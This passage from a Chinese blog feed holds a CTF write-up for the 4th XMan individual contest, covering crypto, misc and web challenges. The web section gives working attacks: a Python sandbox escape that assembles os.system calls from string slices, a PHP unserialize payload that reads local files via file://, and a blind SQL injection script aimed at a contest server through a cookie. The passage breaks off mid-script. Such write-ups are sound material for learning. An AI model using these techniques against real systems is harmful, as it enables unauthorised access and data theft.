  <script id="hbeData" type="hbeData" data-hmacdigest="ae00060c758d2fee8916ee0c9a63299081ed967b8f1e391d026973956919cc02">7e2e5d8e84a6dbe261d42399a5b5d367aa5ac7a44f63f45217acf3df6d4a0f9300e9c47ff349201f79191a300755d613d3fee5344254655b152edb6f00e3ec1c8f2a8cae314e2dc261b1ef640842afd2d5f453199609349c70a086a8a5259923dc9e30ac90bf9d7a943e90d8d91f85af98e93aa7e404ea09798343044031c16be80b4fab06f950789ea8220bec63d331df98a1807a7c3d567e807c23171d38ce97bd64a16e9bd8a58dc0df871b732004302b4c2e9653b807b4a60aef8096a756b7a254cba21c91f20945fd7654f95d035966b0217692f0109a7cde80bbab7a376fd7944a06ecd55a802e8880f889871a1b7a984ee2f94d06c7ffa12606da5d7175fb2272346c2e7743739caf353105af64c2dda26601b28a86bec6415a9f27142cab84177bfe236f0299c206f7efb13cb062830cb867844957d0e7b9e4b45294cec8e195b28dcff4bf1d138180d62933642648f6930f4f3575baa2689b1d4b2ab3b8e6e4cf3e3280947ab61c19c504cc4bf7f293b9f22532df7c56e5e32e898cbda994c6fa82020ee7f063f0ff057bf1f820f053d23be041754fb3cc17ebe3f67427172ed4fba2a6f61c3b67440e09ab35e3b001973915d72da31fb8068eb3fb5f48d187397b0424db8f3d57fcf345b7d28f4b50c6497ba5f7c0a845b8790880b9185298db58b284e3dea2f345c4d0a28eef4745b88340f4e5def35dd7827c047bfa0a4027fb9ffcd7bae557c18776e54402e820fa76836c6a85f655ee40292dd22e738fe6c08f8c8fe157995ae518b2a96653fb0206999d7f9fc099bd0490da690170c904627ef5061d44c248e67189d9701398f1a87721ffe7ae611efd2db0d4b21e7d128d62bb027077f3e3a1fbdf3c072c2436db2b73d42976cacac5254d96314d111fa75b8be48563fdbe2da1cf68ec75b6e3db89e36579dc8473b9664d96cf7902a80d555b08ca19e84fb6de37e5623f9f46ec6fc82dd792a11c572207ba392f2278b30e2d3afd6878415c5aca2a3aeffb1c5b7ba3df32351f9e1fc5227e1efdd013408a16808477862f899ba5ea5ae80efcc30e0236e0cdd40c88b6774563dcae9a6a4329456ffafa51ee361e1df815a67273768d953d5f7c45572579be375b2199c137609a5808b5905ca09bdb872ac110f1a0983b427187e942c152bc281a69d17cb5fc0bafba8e0a79e3dcd900708b1abcf3bc4e99e691a39311a5353a68bbaf3a94073f8d6e72fc23378af9e2ec86260cd3eb2bcf61472ce7e51cefc703e766df0330a367824a762942914fd54dc298719937615cd19c8fea2a827afa211409ba1cef855da8f0e3209594638de25086b28f1db62a8a9b205f32930f76588d6545395fbff1ee2f52f66a74259ec832cef9a0d381e4b04d5e5630ba0fbfacecf5b9b54a63d67babff35ea5a4697c9d1a9198fbe0d80ed98e12fc30934482af18bb18681413a5c8bfea55b2e4aef4d44f74462fe91165ebfe91b9cf56cd1de0a5a6bccf7e2942b3ad48b06f6e053fd389e56cdf60bd3bcf39970568cd2b2d1b9382b181e175b55e0ccfa54945c91176f5a323fd941ba663dad4a4a08f7ecab430a409019c3353de6929879f57ad869a415f2de1d95793aa25c682905d7527d0f7f8a0e1674f4b654de3ef455d4b4c71d5cde27764c7182cb28f5faefdd3d80ff677f55bdb2101466bdbddc8d54d031ddb16a4fa1094f59780e4a5f0d5eb584cd01e6f4429fe054941d13c36105cddf941ff54ab777f70f1cf205163a39a34a06306dd6469a0d899d87287e357078bb3c312109e650df6a1bd1a6daabd02f0b3eb77aab8738ceac33982deb6d942dbc2247734563ca6b92d23a308ab3c0e32620f319c2b1d7c8660da01cbe155cca02d903611c7c50893c4f43c9c26e6511075adf01e38989c41d7820167bfd524a96eb22125900c4c6d3c3887182d895610da9130ba354ce0740f36a3bb396621ae1031a97d7237d182ed9c91f163f166c8e8e8c59dd0c5199156be85dc4c87e0580f18fd334152c6160e0fc3b946eda6727a885a746ea27369cbee7588b0af39dba6eb12e710c58e602cbe88ecdfb2d2131d1e64cc2f874361fee7cab3d0d4d3e0c19c36b383e65818998463fe9c1673c7453d32b0d8755296e07543a626bdef45a5d960944944a9fe0105e9019f6197ab0d75f6e23f8741fc114c50bb4c6c0027a32ba25f3069950e95d03d4cf4d93fbec31be64ea392b6821bc7b1cd66888a02ca2783b07bde214cda9543d3aa587d4ac2aeea621205fc73b614bb146c8973bd26e07c2b668ecc536a3a935b84c68a947e019f8ba63121adf5d6817e0dbd46f04ddde1ecd0caa7669382f1c204d48b80b19a9cc866bca550c659a92d981331ada49afb3cdb5f9f35b5c5fd0fc497d1749cf7f7dad13b6fc52cdd07c49af00361d861133ccabbb7d925ceb417f9fbbd7e3974bb1906848c6bd2664b8fcb98ab20f0c57167b740553c13f2b339bc51cd4a69d1bc98c3a63234fcf40aa0ee26520ad9bb23da8adf0a5af2859c10525bfcc684bbba8155a7468342b1d8193a40404806e91db168b3befe8444045bd16d92e7a43763fc7d04627a04be284224b45002d09da2d3d301b9bad578197c3ec572889e0b4d8163924f18977ee4856ab77ea574b4ffd087bb4e1e57707511d06f48461cf8967e8febb1ba994fbb8509d85a3a0a1876858ae2cbae163ff3b0de75405269e235715ecc51fbda58b8381d4e95f68ce4291dc922f02913f1ea27a7f1d6d06a6d93d6aed9584ae49f5708bb18103afae0138ccbf59a52e08cad837809cb8ec92f8a4ec8db1c5920d6cad66cffffa32e9924293ec0fc6720852275169a4892fc87533a5307b67cf8f5b5af58319a8900db96d643c26c757f6fe05a0312139acb255faa9586140d33e00298ef1288790fefe89a0c5b1fab2b455184a1d4507d1b58eb840448ba777596484bf670632ca367b9eeb6af1ef0640c755d2feb68c6c9efb546318a508a92ec2378412fbea12c9b4d94139c50b83525261e4f59913ae28f69fd61a7212701390d82f4270f0963821d3ee52fe63da91e56ffe36db8b1b6e183b32d85142fc30a98c02db1158a10b084f95ab26e06ef9a821297dc29500cade0641363410dcf642a9f85b6832f2b8ca5a291311e43405a8ce26a0e5f53a8b3ad10f5f2639af9c2978a6c7b2b6e8d2ff1b6f68303fe88a356f50ebf04744126662cb57a44336444e25389b5adb6c16c35961981dded16c77e9e0a91309237a9a44f4214c99f24d22c3e0f0c299eaf470c5dd68aa00fb76aa05be1d03a120d6a4f6d6e5284002271d46fdb8c58de72c0e1f32112f4296b79e01676655c535235d2bfc190c0f150fb3c88455982ff70f82aeb1ce85c5d3f30d95a4739de0ad8301a89c38e5baf14cefb31e919880b23f4670fe03dbdd8a888264a97c0e54969188e09461b46656c161b93c76666ed2e4a4b8db865cb1abd70cfd0fc1cca22cc865a12cc7a4a84e188b69fbd16d04a06dd196b9f05670d54b6f260755adb0a7fbe2e8caff3843e60a1a93b5ac90f024b0b8369754d964bb567d84a6b5aa7b780cc1c7aa732d0c2423f339555084d6cdb67b864e28445dc7ba66970f3ef30029182cd411e3b45031cc64d01b5c5db242e991dae194ee9c4e1b191a6043343332779f9e43a89970a87c09160bba67466a777f815414b7d4e90aa63ceab6d1991c27b3ab8e3133e4ab586c758bbf2c5f3a5fb407a8f8ae9050bb523b4d14acc6b02229ef2d596eec2f67d3f7e70f45925b2b3959f5eefb1f3842b8b3417c4d32ed080c10369ab715287b86a44ae65f62fd3758985c174fdc0639b4c6f250e3a1d842695bff5b81c8573d4d51f03c8c2921642f6351435dbd3b4c4bccd973dd216dc9b579508898937467c48bdef7f0b244d877e6a4a83ccd2c9eed961fd71f9f655cd3d76c343240a6594fe428099c1f5a817b849742aebc00b349e7d4a5408e119d0fa11ee626abed7324dec81168db035d522316d32a7af0c611a0d917c788cc3a4e6d5d744e1e5a9b9930b98709d02c87b6092c0155bc43cf05f40d911698ca06a23cca4e81d47eee066c9a5f77fc73d763f90b236d913db891ee83342a6063b099b066894347a65c6859031d6e87d1806cec2eac85d5e0d2be4466863370eb9fac1663b628a109ea8512edd43a72d6b064694425c165fb1d736655820cfd2f1523605a44036134d8bc4e4a1daad09b6faa668f8e1a4d0c082827d5f265cbc70a9b6c81920f59545a4a03462005dba27c47a341925619a264e5ad4903996ded4a2fb5c260d5ddda198cfe72947f1be2836093e65c56058d50a770b798bd12189fa8e2642124976ec3c4ba4ef768b853c02b4750ba6d5257f359dd4fb050554614e8fe0dc5c2626637b9788075ab171849bd80e8824c2e85391ab7b4bcc1774e974818270c3be52b670602fd13a7c34590f9a56b7e93a5c687f83eca6d9b44070759a634358ecff8d2fc0ab7f148f3a41f8342107fadcca003357e3d0243a1cfc9d1c77d2e41e873928753cb66459fa27d7b96c7ac1071724b081f2487adec23dfa7545ae7b4712bbb3a5c937cb27d9abb7a64b2343b55711704c03321b3cbd4043eba1e40a43ecee3095a42a7b26b0469f5e56595a9dfd2f2e8e25bc01b7d1be55626a2c6ca1920f97be2911ac8f9eaf28529c57ea26683372c5f1bf310050c4c967fae61fa3ba8ecb6e2347733ae319125ae5f14f0afe267f67e5f8fd126904fb55573f3df8e1637749842f99811e6b4ff82e716ac0fcffcc1d9e1fbc03fccdfc5ff9e3cb548fbf3119ddca96b9d0dc0c2d552f767667bf18f543fd334896d5f20fa73e39c0c7026eb6d9853d5b07faa90279597a914ec6e8f941162046e90765a69a7a3f82ba15e20d47aa47d2d587810b99b203f668577b4a165d5ddf588d6dcab7001088cc94d0c2067cd5652fff7ce4a532f8c7bffb1c6ec5926bc5c293b6f2c4611d0123106443fcb3a10d45d64d04df5790678da51beacbb9c11f70a86f76afedfdcd39556bd12d19e65f5f8edc14ce18ee97011b9625e57a47fb4d68ecd686407faaecf12f5b9a27a2366c4cf3533c4114d3934744804a135cf362ad89a13ab6aea046a928c2dcfae56de7eaa3128f39804586b6402e5568b94ba609124d6c5d7b0db72a8c869a398304c49e703d02ad3e86a63361c09c111bfcb4e41384f5ed774f6d9763d2e0e119ee80d210405ec58417a4b33c011dd3e387f9a28113c6391ad98ca7d60c8b882f0323dcde6aa035759ff932300e86c7193d831364bc49c9a6af9ff26da900c5686327da2ade5b442399b0d71d266c2b0a5146463d7c8c94a9ac5c0f5f6e9be430fb855685f80f06cf28e76e3394cd19308e4799356e162b0bfed941f9e2d51311ee151e18f89116e7c99e16f5a657b583ac3be1c5027f1b09f573060e82c9f1adee1ee836b33750831bcbfb9bb2b7f41df6f5a6ffcae284e07e32556686567997bfaaa7597496618ac09b9cf9940ddf727ade185256165a0eda54091d8a37408ade3477356a54df27b9f15b2b9e2239b1f433c4654039c6f00310d7b45867508243e17ba6452acf60fc2ac5fa81fa1fb5bd85556d93ffc8a9c0ed92d6dd389fb212542a7fce091f1b48c36638909e22fab41738814bed950b63973535e5e66740326267e02333960f9ed3f231c6a2f60be656fc64fc1c262b04e594600c2cec45d2b6fb94a73beef272da1674c7a095dadd2f8abd998b7a5a4dfeded19ae31c21f2e3cbd84d59af5d278f21cf8de8504f2a712f02c59606928b8ffa8be871302b1fd00abfda1212dcb0a06fd9055bffae141cc8d672bfb0008bd62a89f1da2da095d2ccfc60b5509c33b8602383d2adea199b7e7a1597df3e6dcf66efb6b414d75806e595a3a8adc7328cdb0e919d99dc9cc7f40deef275d4f7d353bc67fc70876c94e5cc8c20d791ce6ce4cf196d6dd48c8f2c81e256a268846b65590eac5c04f924899af58b1d31328e917463dd59b5dce3ca0a01ca4fd191e0c625c5656de9beedebb04d63b66baf8a8ca4de64e4994fb4666eef19e67a4b53dc86fbeb82cde68f09c77cc8eb136f180676e2474ebdf1ef6b789105dec74df4d17c41a93a6c96ad1ec6aa92c61ca6838b6beca509796bb0904c43b089490aefcaca497e1a3c56749e47d7d2b75e81f263ef5963b1d349532cb8c56ae318a307fde57859b019dfa72288c035003e8e73b2ae752874d47a62e4715d34fcf47b0d1d7242bf3bad231c2b4b01eaf8983c579369f0fbe96667d478d7f7c9b8454ab3d11146bdc96f429af6bb910e7bf9f500dc99da368cd009b96f70682af6d282abece5bf1e22d7be486e89939add9ea2aa4ae9ede6774399e6d2dc87686d741ec977847d95c851ced69a3938c8f6a53b447e74fd49bdba83ab9f447a4f1fbc634bbb6c05096cda75d5180531e3521c457beddfe1a606b40e2502d1774577542ee54b0d1fa648765af69c302e78d8579f21badba2c734c514b150094fa7b21e470e1d1cbaf4ad29d37145f0cc6c5274569faf57ca0ad67181f11914f4c7e3e2556c5cb2329d35a198c9fefb93337ed8e20183d0ad1618821c905b21577d8666379951516a46a04a790b70796398bcca9dd582dd5038c7cedb9135776c159a841e7fdfd3bef600beb85d5b5eac9e9d01dcc4919a3025c227c0c785b5aa91edcc137d730a42c52030f111958e0f2d73c7f7c31e82cc743f67558f64a7e57351d6e76a66178f7ac85c4c8b0640458854f7fb78d75bbd2ae9ba13350a0a41e74867b3bf3b1e7cfc713539f62bcaa0965cbe2621cca66d254ba</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届XMan个人排位赛 部分题解</title>
    <url>/2019-XMan-Personal/</url>
    <content><![CDATA[<p>今天有丶累，但是吃了牛排加看了两场电影有些开心。</p>
<span id="more"></span>
<h3 id="crypto">Crypto</h3>
<h4 id="commom_encrypt">commom_encrypt</h4>
<p>给了一个密文和一个加密脚本，看了一下，一个简单的分组异或而已，直接利用原加密函数爆破一遍，然后栅栏解密。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">c = <span class="string">&#x27;f^n2ekass:iy~&gt;w|`ef&quot;$&#123;Ip)8if&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, groupnums</span>):</span><br><span class="line">    a = []</span><br><span class="line">    b = []</span><br><span class="line">    section = <span class="built_in">int</span>(<span class="built_in">len</span>(data) / groupnums)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), section):</span><br><span class="line">        a.append(data[i:i + section])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(section):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(groupnums):</span><br><span class="line">            b.append(a[j][i])</span><br><span class="line">    cipher = (<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i]) ^ i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b))))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        e = encrypt(c, i)</span><br><span class="line">        elen = <span class="built_in">len</span>(e)</span><br><span class="line">        field = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, elen):</span><br><span class="line">            <span class="keyword">if</span> (elen % i == <span class="number">0</span>):</span><br><span class="line">                field.append(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> field:</span><br><span class="line">            b = elen / f</span><br><span class="line">            result = &#123;x: <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(b)&#125;</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(elen):</span><br><span class="line">                a = i % b</span><br><span class="line">                result.update(&#123;a: result[a] + e[i]&#125;)</span><br><span class="line">            d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">                d = d + result[i]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> d:</span><br><span class="line">                <span class="built_in">print</span> d</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{crypt0_1s_1nt3r3st1ng!}</strong>。</p>
<h3 id="misc">Misc</h3>
<h4 id="onions_secret">onion's_secret</h4>
<p>解压后得到图片，<strong>binwalk</strong>后得到压缩包和<strong>hint.txt</strong>，打开提示了有一位需要爆破的密码，爆破解压后又是一个压缩包，看来是要写脚本了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path=<span class="string">&quot;./onion/&quot;</span></span><br><span class="line">pw = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    filename = path + <span class="string">&quot;/onion.zip&quot;</span></span><br><span class="line">    zFile = zipfile.ZipFile(filename)</span><br><span class="line">    hint = <span class="built_in">open</span>(path + <span class="string">&quot;/hint.txt&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pw:</span><br><span class="line">        password = hint[<span class="number">0</span>] + i + hint[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zFile.extractall(path=<span class="string">&quot;./onion/&quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot;/&quot;</span>, pwd=password)</span><br><span class="line">            path = <span class="string">&quot;./onion/&quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot;/&quot;</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span> password</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{b64a485e800ab8d3ac4d5b059c33305d}</strong>。</p>
<h4 id="strange_ssid">strange_ssid</h4>
<p>根据题目提示，写个脚本提取了一下<strong>ssid</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> scapy_http.http</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> scapy.layers <span class="keyword">import</span> http</span><br><span class="line"></span><br><span class="line">packets = rdpcap(<span class="string">&quot;./ctf.pcap&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;802.11 Information Element&quot;</span> <span class="keyword">in</span> packet:</span><br><span class="line">        f.write(<span class="built_in">str</span>(packet).split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>] + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>试了几个逐位异或之类的无果，然后突然发现<strong>ssid</strong>的长度是<strong>32</strong>位的，于是猜测是<strong>md5</strong>，正则匹配全文就只有一组数据符合条件，且有解密结果，遂尝试提交为<strong>flag</strong>，答案正确。</p>
<h3 id="web">Web</h3>
<h4 id="escape">escape</h4>
<p>一个<strong>python</strong>沙箱逃逸，测试发现<strong>ban</strong>了许多函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">banned:  [&quot;&#x27;&quot;, &#x27;&quot;&#x27;, &#x27;.&#x27;, &#x27;reload&#x27;, &#x27;open&#x27;, &#x27;input&#x27;, &#x27;file&#x27;, &#x27;if&#x27;, &#x27;else&#x27;, &#x27;eval&#x27;, &#x27;exit&#x27;, &#x27;import&#x27;, &#x27;quit&#x27;, &#x27;exec&#x27;, &#x27;code&#x27;, &#x27;const&#x27;, &#x27;vars&#x27;, &#x27;str&#x27;, &#x27;chr&#x27;, &#x27;ord&#x27;, &#x27;local&#x27;, &#x27;global&#x27;, &#x27;join&#x27;, &#x27;format&#x27;, &#x27;replace&#x27;, &#x27;translate&#x27;, &#x27;try&#x27;, &#x27;except&#x27;, &#x27;with&#x27;, &#x27;content&#x27;, &#x27;frame&#x27;, &#x27;back&#x27;]</span><br></pre></td></tr></table></figure>
<h5 id="解法1">解法1</h5>
<p><strong>ban</strong>了很多，包括单双引号以及点，导致找不到地方输入字符串，苦思冥想后发现似乎可以截取系统变量名和函数名来拼接字符串，且<strong>getattr()</strong>函数未被过滤，因此尝试构造如下字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(getattr(os,&quot;system&quot;)(&quot;ls&quot;))</span><br></pre></td></tr></table></figure>
<p><strong>fuzz</strong>一下，截取如下变量名拼接字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir(0)[0][4]  //s</span><br><span class="line">filtered[26][2] //y</span><br><span class="line">dir(0)[5][4] //s</span><br><span class="line">dir(0)[6][-5] //t</span><br><span class="line">dir(0)[5][4] //e</span><br><span class="line">dir(0)[4][3] //m</span><br><span class="line"></span><br><span class="line">dir(0)[3][3]  //l</span><br><span class="line">dir(0)[0][4]  //s</span><br></pre></td></tr></table></figure>
<p>然后就可以成功逃逸。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system = dir(0)[0][4] + filtered[26][2] + dir(0)[0][4] + dir(0)[6][-5] + dir(0)[5][4] + dir(0)[4][3]</span><br><span class="line"></span><br><span class="line">ls = dir(0)[3][3] + dir(0)[0][4]</span><br><span class="line"></span><br><span class="line">print getattr(os,system)(ls)</span><br></pre></td></tr></table></figure>
<p>发现<strong>flag</strong>刚好在当前目录下，于是继续拼接字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat_flag = dir(0)[3][2] + dir(0)[0][2] + dir(0)[6][-5] + s[-3] + dir(0)[10][2] + dir(0)[3][3] + dir(0)[0][2] + dir(0)[13][2]</span><br><span class="line"></span><br><span class="line">print getattr(os,system)(cat_flag)</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</strong>。</p>
<h5 id="解法2">解法2</h5>
<p>直接使用<strong>del
filtered[:]</strong>或者<strong>filtered=[]</strong>删除过滤器，然后<strong>os.system('cat
/flag')</strong>。</p>
<h4 id="ezphp">ezphp</h4>
<p>简单反序列化，源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$b</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;a, <span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$b</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$c</span>, CURLOPT_URL, <span class="variable">$this</span>-&gt;a);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$c</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$c</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;z&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;z&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是<strong>Payload</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span> = (<span class="string">&quot;file:///%66%6c%61%67&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Hello</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// /?z=O%3A5%3A&quot;Hello&quot;%3A1%3A%7Bs%3A4%3A&quot;%00%2A%00a&quot;%3Bs%3A20%3A&quot;file%3A%2F%2F%2F%2566%256c%2561%2567&quot;%3B%7D</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{ea40e3f71bd54d9d1fcfbc8e22d8f7cf}</strong>。</p>
<h4 id="profile">profile</h4>
<p>右键源代码得到一个测试账号，登陆后发现在<strong>cookie</strong>中存在一个序列化字符串，测试后发现存在<strong>sql</strong>注入，<strong>Sqlite</strong>的数据库，附上脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.97.253.115:10007/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">command = <span class="string">&quot;select password from users limit 1,1&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;&#x27; and substr((&#123;command&#125;),&#123;position&#125;,1)&gt;0 --&quot;</span></span><br><span class="line">    userinfo = <span class="string">&quot;&#123;\&quot;username\&quot;:\&quot;test&quot;</span> + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)) + <span class="string">&quot;\&quot;,\&quot;password\&quot;:\&quot;test\&quot;&#125;&quot;</span></span><br><span class="line">    userinfo = base64.b64encode(userinfo)</span><br><span class="line">    cookies = &#123;<span class="string">&quot;userinfo&quot;</span>: userinfo&#125;</span><br><span class="line">    r = requests.get(url=url, cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">min</span> = <span class="number">1</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">256</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">            cookie = <span class="string">&quot;&#123;\&quot;username\&quot;:\&quot;test&#x27;&#123;payload&#125;\&quot;,\&quot;password\&quot;:\&quot;test\&quot;&#125;&quot;</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; and substr((&#123;command&#125;),&#123;position&#125;,1)&#123;operator&#125;&#x27;&#123;mid&#125;&#x27; --&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>):</span><br><span class="line">                userinfo = <span class="string">&quot;&#123;\&quot;username\&quot;:\&quot;test&quot;</span> + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;=&quot;</span>,</span><br><span class="line">                                                                   mid=<span class="built_in">chr</span>(mid)) + <span class="string">&quot;\&quot;,\&quot;password\&quot;:\&quot;test\&quot;&#125;&quot;</span></span><br><span class="line">                cookies = &#123;<span class="string">&quot;userinfo&quot;</span>: base64.b64encode(userinfo)&#125;</span><br><span class="line">                r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;Welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = <span class="built_in">max</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span 